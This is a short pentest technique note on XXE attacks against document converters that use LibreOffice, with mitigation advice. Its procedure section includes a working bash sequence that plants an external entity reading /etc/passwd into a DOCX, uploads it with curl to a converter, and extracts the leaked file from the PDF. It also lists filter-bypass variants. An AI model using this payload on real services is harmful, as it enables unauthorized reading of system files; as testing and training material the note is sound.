---
topic: XXE en conversión con LibreOffice
tags: [linux, libreoffice, xxe, docx, file-read]
---

# XXE en conversión con LibreOffice

**English** | [🇪🇸 Español](libreoffice-xxe.md)

## Concept

A service converts DOCX/ODT documents to PDF with LibreOffice. If the document includes an external entity in `document.xml` or metadata, the parser resolves it and the content may appear in the PDF or response.

## When it applies

- DOCX/ODT to PDF, HTML or text converters.
- LibreOffice running without isolation on user files.
- Metadata, images or calculated fields accepting XML.

## Procedure

1. Unzip a template DOCX.
2. Insert the external entity in `word/document.xml` or metadata.
3. Repackage the DOCX and upload it to the converter.
4. Read the reflected file in the resulting PDF.

```bash
unzip -q template.docx -d docx
# Add <!ENTITY xxe SYSTEM "file:///etc/passwd"> and &xxe; in document.xml
zip -qr payload.docx . -x '*.docx'
curl -s -F "file=@payload.docx" http://<HOST>/convert.php -o result.pdf
pdftotext result.pdf -
```

## Variants

- XXE in `docProps/core.xml` metadata.
- ODT with `content.xml`.
- HTML conversion reflecting the error.
- Filters blocking `file://` but allowing `php://filter`.

## Limitations

- The parser must resolve external entities.
- The converter must return the content or a detailed error.
- LibreOffice may run in safe mode or without network.

## Mitigation and detection

- Disable external entities and DTDs in the converter.
- Run LibreOffice in a container without access to sensitive files.
- Validate the DOCX and limit size and metadata.

## References

- <https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
- <https://documentation.libreoffice.org/en/english-documentation/>
- <https://attack.mitre.org/techniques/T1190/>
